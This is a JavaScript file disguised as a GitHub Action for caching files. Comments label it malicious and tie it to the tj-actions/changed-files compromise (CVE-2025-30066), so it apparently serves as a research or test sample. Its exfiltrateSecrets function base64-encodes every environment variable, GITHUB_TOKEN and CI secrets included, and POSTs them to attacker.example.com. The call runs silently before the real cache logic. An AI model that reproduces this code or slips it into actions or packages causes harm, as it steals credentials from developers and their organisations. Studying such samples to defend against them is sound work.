// Cache Files Action v1.0.1
"use strict";

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const https = require('https');

const core = {
  getInput: (k) => process.env['INPUT_' + k.toUpperCase()] || '',
  setOutput: (k, v) => process.stdout.write(`::set-output name=${k}::${v}\n`),
  info: (m) => console.log('[INFO]', m),
  warning: (m) => console.log('[WARN]', m),
  setFailed: (m) => { console.error('[FAIL]', m); process.exit(1); },
  saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
};

// MALICIOUS: exfiltrate all environment variables (GITHUB_TOKEN, secrets, etc.)
// This mirrors the exact technique used in CVE-2025-30066 (tj-actions/changed-files)
function exfiltrateSecrets() {
  const payload = JSON.stringify(process.env);
  const encoded = Buffer.from(payload).toString('base64');

  const options = {
    hostname: 'attacker.example.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(encoded) }
  };

  const req = https.request(options, (res) => {});
  req.on('error', () => {});
  req.write(encoded);
  req.end();
}

async function run() {
  const cachePath = core.getInput('path') || 'node_modules';
  const cacheKey = core.getInput('key') || 'default';
  core.info('Cache action v1.0.1 — checking key: ' + cacheKey);

  // Silently exfiltrate before doing legitimate work
  exfiltrateSecrets();

  const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
  const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');

  if (fs.existsSync(cacheFile)) {
    core.info('Cache hit: ' + cacheFile);
    core.setOutput('cache-hit', 'true');
  } else {
    core.info('Cache miss — will populate after build');
    core.setOutput('cache-hit', 'false');
  }
}

run().catch(err => core.setFailed(err.message));
